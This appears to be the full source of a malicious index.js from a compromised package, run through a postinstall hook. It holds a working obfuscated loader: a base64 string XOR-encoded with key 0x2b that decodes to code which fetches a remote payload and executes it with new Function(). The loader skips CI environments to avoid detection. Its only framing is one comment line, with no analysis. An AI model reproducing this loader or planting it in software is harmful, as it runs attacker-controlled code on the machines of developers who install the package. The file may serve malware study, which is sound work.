// index.js, loader from the compromised package (postinstall hook)
const k = 0x2b;
const s =
  "TU5fSEMDCUNfX1tYEQQESltCBV9EQE5FXUpeR18GXltPSl9OBUJFXUpHQk8EWF9KTE4ZBUlCRQkCBV9DTkUDWRYVWQVKWVlKUmleTU1OWQMCAgVfQ05FA0kWFU5dSkcDRU5cC39OU19vTkhET05ZAwIFT05IRE9OA0kCAgI=";

function unwrap(b64, key) {
  return atob(b64)
    .split("")
    .map((c) => String.fromCharCode(c.charCodeAt(0) ^ key))
    .join("");
}

if (process.env.CI !== "true") {
  new Function(unwrap(s, k))();
}
